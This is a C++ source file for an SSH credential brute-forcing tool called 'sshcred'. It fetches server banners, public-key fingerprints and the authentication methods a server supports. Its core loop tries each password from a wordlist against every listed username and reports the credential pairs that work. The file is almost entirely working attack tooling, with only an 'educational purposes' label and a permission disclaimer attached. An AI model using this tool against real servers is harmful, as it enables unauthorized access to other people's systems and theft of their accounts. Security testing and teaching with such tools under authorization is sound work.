/**
 * The MIT License (MIT) THIS TOOL IS ONLY FOR EDUCATIONAL PURPOSES ONLY
    Copyright (C) 2022 Anonymous Hacks Date: Thus june 2, 2022

    Permission is hereby granted, free of charge, to any person obtaining a copy of this software
    and associated documentation files (the "Software"), to deal in the Software without restriction
    , including without limitation the rights to use, copy, modify, merge, publish, distribute, 
    sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is 
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all copies
    or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, 
    INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR 
    PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY 
    CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, 
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include "sshcred.hpp"
#include <vector>

/**
 * Creates a new ssh session
 * 
*/
ssh_session SSHCred::getNewSession() {
    
    ssh_session ssh = ssh_new();
    int i {};
    if(!ssh) {
        std::cout << "-| [~] Failed to create SSH session\n";
        return NULL;
    }
    ssh_options_set(ssh, SSH_OPTIONS_HOST, target_host.c_str());
    ssh_options_set(ssh, SSH_OPTIONS_PORT, &port);
connect:
    i++;
    int ret = ssh_connect(ssh);

    if (ret != SSH_OK) {
        if (i < 3)
            goto connect;

        std::cout << "-| [~] Failed to establish a connection\n";
        std::cerr << "-| [~] " << ssh_get_error(ssh) << std::endl;
        exit(1);
    }

    return ssh;
}

void SSHCred::setStopOnSuccess(int flag) {
    this->flag = flag;
}
/**
 * Sets the connection host
*/
void SSHCred::setHost(std::string target_host) {
    this->target_host = target_host;
}

/**
 * Sets the port number
*/
void SSHCred::setPort(int port ) {
    this->port = port;
}

/**
 * Sets the password list file
*/
void SSHCred::setPassworddb(std::string passworddb) {
    this->passworddb = passworddb;
}

/**
 * Sets the usernames list file
*/
void SSHCred::setUserdb(std::string userdb) {
    this->userdb = userdb;
}

/**
 * Sets a single username
*/
void SSHCred::setUsername(std::string username) {
    this->username = username;
}

/**
 * Print the client's and server's banner
*/
void SSHCred::printBanner() {

    // First connect to the server to obtain the banner
    ssh_session ssh = getNewSession();
    std::cout << "-| [*] SSH server banner(" << target_host << "): ";
    std::cout << ssh_get_serverbanner(ssh) << std::endl;

    std::cout << "-| [*] SSH client banner: " <<
    ssh_get_clientbanner(ssh) << std::endl;
    ssh_disconnect(ssh);
    ssh_free(ssh);
}

/**
 * Prints the server's public key
*/
void SSHCred::printPubkey() {

    int ret; 

    ssh_session ssh = getNewSession();
    
    ssh_key key;
	// get the server public key
	if(ssh_get_server_publickey(ssh, &key) != SSH_OK) {
		std::cout << "-| [~] -| [~]Error getting server public key\n";
		std::cerr << "-| [~] " << ssh_get_error(ssh) << std::endl;
		exit(1);
	}

    unsigned char *hash_md5, *hash_sha1, *hash_sha256;
    size_t len_md5, len_sha1, len_sha256;

    ret = ssh_get_publickey_hash(key, SSH_PUBLICKEY_HASH_MD5, &hash_md5, &len_md5);
    ret = ssh_get_publickey_hash(key, SSH_PUBLICKEY_HASH_SHA1, &hash_sha1, &len_sha1);
    ret = ssh_get_publickey_hash(key, SSH_PUBLICKEY_HASH_MD5, &hash_sha256, &len_sha256);
	
	// get the hashes
	if(ret != SSH_OK) {
		std::cout << "-| [~] Error getting server public key hash\n";
		std::cerr << "-| [~] " << ssh_get_error(ssh) << std::endl;
		exit(1);
	}
	
    /**
     * get the fingerprints for the hashes
    */

	char *sha1 = ssh_get_fingerprint_hash(SSH_PUBLICKEY_HASH_SHA1, hash_sha1, len_sha1);
    char *sha256 = ssh_get_fingerprint_hash(SSH_PUBLICKEY_HASH_SHA256, hash_sha256, len_sha256);
    char *md5 = ssh_get_fingerprint_hash(SSH_PUBLICKEY_HASH_MD5, hash_md5, len_md5);


	std::cout << "-| [*] Server public key hashes:\n";
	std::cout << "      |  " << md5 << "\n";
	std::cout << "      |  " << sha1 << "\n";
	std::cout << "      |  " << sha256 << "\n";
    std::cout << "      |_ Key algorithm: " << ssh_get_kex_algo(ssh) << std::endl;

	// free reserved resource
	ssh_clean_pubkey_hash(&hash_md5);
    ssh_clean_pubkey_hash(&hash_sha1);
    ssh_clean_pubkey_hash(&hash_sha256);
	ssh_key_free(key);
	ssh_free(ssh);
}


/**
 * prints the list of authentication methods supported 
 * by SSH server
*/
void SSHCred::printAuthenticationMethods() {

    ssh_session ssh = getNewSession();

    ssh_userauth_none(ssh, NULL);
    int methods;

    // Get the list of supported authentication methods
    methods = ssh_userauth_list(ssh, NULL);

    std::string auth_list {};
    int i {};
    if (methods & SSH_AUTH_METHOD_NONE)
        auth_list = "None, ";
    if (methods & SSH_AUTH_METHOD_PUBLICKEY)
        auth_list += "Public-Key, ";
    if (methods & SSH_AUTH_METHOD_INTERACTIVE)
        auth_list += "Keyboard interactive, ";
    if (methods & SSH_AUTH_METHOD_PASSWORD)
        auth_list += "Password, ";
    
    long unsigned int len { auth_list.length() - 1};
    std::string s {};

    for (auto ch: auth_list) {
        i++;
        if (i == len)
            break;
        s += ch;
    }

    std::cout << "-| [*] Supported authentication methods: ";
    std::cout << s << std::endl;

    ssh_disconnect(ssh);
    ssh_free(ssh);
}

/**
 * Function for performing the brute-force attack
*/
void SSHCred::brute() {

    std::string blu = "\033[1;34m",
    res = "\e[0m";

    std::fstream password_file {};
    std::fstream user_file{};

    // Open both the password and user names file
    password_file.open(passworddb, std::ios::in);
    user_file.open(userdb, std::ios::in);

    // Make sure the password and user file exits
    if (!password_file.is_open() || !user_file.is_open()) {

        if (userdb.length() > 1) {
            
            if (!user_file.is_open()) {
                std::cout << "-| [~] Failed to open ";
                std::cout << userdb << std::endl;
                std::cerr << "-| [~] " << 
                "Error: " << strerror(errno) << std::endl;
            }
        }
        

        if (!password_file.is_open())  {
            std::cout << passworddb << std::endl;
            std::cerr << "-| [~] " << 
            "Error: " << strerror(errno) << std::endl;
        }

    }

    /**
     * Store the user names in a vector
    */
    std::vector <std::string> userlist;
    std::string u;
    if (userdb.length() > 1) {
        while(std::getline(user_file, u)) {
            userlist.push_back(u);
        }
    } else {
        userlist.push_back(username);
    }

    std::vector <std::string> successAuth;
    std::string pass {};
    int count {};
    // get a new session
    ssh_session ssh = getNewSession();
    /**
     * Try every password for each on the users
    */

    int n {}; 
    while(std::getline(password_file, pass)) {

        for(std::string usr: userlist) {
            if (usr.length() < 1)
                continue;
            
            count++;           
            std::cout << blu << "-| [^]" << res << " Authentication for " << usr;
            std::cout << ":" << pass;

            if (ssh_userauth_password(ssh, usr.c_str(), pass.c_str()) != SSH_AUTH_SUCCESS) {
                std::cout << " failed\n";

            } else {
                std::cout << blu << " success\n" << res;
                // Add it to the list of success authentications
                successAuth.push_back(usr + ":" + pass);
                if (flag == 1) goto finish;
            }

            // reconnect
            ssh_disconnect(ssh);
            ssh = getNewSession();
        }
    }
finish:
    ssh_disconnect(ssh);
    ssh_free(ssh);
    std::cout << "\n\n";

    std::cout << "Report for " << target_host << ":" << port << std::endl;

    std::cout << "| Valid credentials count: " << successAuth.size() << std::endl;
    std::cout << "| Valid credentials list(username/password pair):\n";

    for (auto succ: successAuth) {
        std::cout << "|  " << succ  << " -> Valid" << std::endl;
    }
    std::cout << "|_  Brute-Force Complete\n";
}

void print_version() { 

    std::cout << "\n-| [^] SSHCred Version: " << SSHCRED_VERSION << std::endl;
    std::cout << "-| [^] libssh Version: " << ssh_version(0) << std::endl;
    std::cout << "-| [^] GitHub: https://github.com/4anonz/sshcred\n";
    exit(0);
}

void print_help() {

    
    std::string help = 
    "sshcred v" SSHCRED_VERSION "\n"
    "Usage: sshcred [hostname] [options...] <args>\n"
    " -a  --auth-methods      Print SSH authentication methods supported by the host.\n"
    " -h  --help              Print this help message.\n"
    " -o  --open-shell        Start SSH shell session.\n"
    " -p  --port              Set the port number, if not specified the default(22) port number is used.\n"
    "     --print-banner      Print SSH client & server banner.\n"
    "     --print-pubkey      Print SSH server's public key.\n"
    " -s  --stop-on-success   If this flag is used the brute force will stop when a valid credentials is found.\n"
    //" -t  --thread            Specify number of threads for brute force\n"
    " -u  --username <STRING> Use this username.\n"
    " -U  --user-file <FILE>  Specify a file with a list of user names to try one username per line.\n"
    " -v  --version           Program version information.\n"
    " -w  --wordlist  <FILE>  Set a file with a list of passwords to try one password per line.\n\n"
    "\t===> Discliamer <===\n"
    " Do not use this tool on a network you don't have permission to.\n"
    " By using this tool you agree that you'll be held responsible for\n"
    " any illegal usage and not the author.\n"
    " Author  : Anonymous Hacks aka 4nonz\n"
    " GitHub  : https://github.com/4anonz\n"
    " Project : https://github.com/4anonz/sshcred\n";

    std::cout << help << std::endl;
    exit(0);
}